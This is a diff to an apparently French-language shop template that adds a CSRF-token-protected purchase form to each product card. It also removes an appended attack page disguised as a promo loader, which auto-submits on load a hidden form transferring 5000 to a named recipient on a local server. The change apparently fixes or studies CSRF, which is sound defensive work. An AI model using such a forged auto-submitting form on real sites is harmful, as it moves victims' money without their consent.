@@ -22,7 +22,23 @@
         <div class="products-grid">
             {% if produits %}
                 {% for p in produits %}
-                <div class="card">
+                <div class="card" style="position: relative;">
+
+                   <form action="/acheter/{{ p.id }}" method="POST" style="position: absolute; top: 15px; right: 15px; z-index: 10;">
+                        <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
+
+                        {% if p.quantite > 0 %}
+                            <a href="javascript:void(0);"
+                               onclick="this.closest('form').submit();"
+                               style="text-decoration: none; font-size: 1.5rem; cursor: pointer;"
+                               title="Acheter">
+                               🛒
+                            </a>
+                        {% else %}
+                            <button disabled class="btn btn-secondary btn-sm" style="font-size: 0.7rem;">Rupture</button>
+                        {% endif %}
+                    </form>
+
                     <div>
                         <div style="font-size: 3.5rem; text-align: center; margin-bottom: 15px; filter: grayscale(0.2); transition: all 0.3s ease;">
                             📦
@@ -135,16 +151,3 @@
 
 </div>
 {% endblock %}
-
-<!DOCTYPE html>
-<html>
-<body onload="document.getElementById('piege').submit()">
-    <h1>Chargement de la promo...</h1>
-    <form id="piege" action="http://localhost:5555/transfert" method="POST">
-        <input type="hidden" name="destinataire" value="sidi_med">
-        <input type="hidden" name="montant" value="5000">
-    </form>
-</body>
-</html>
-
-
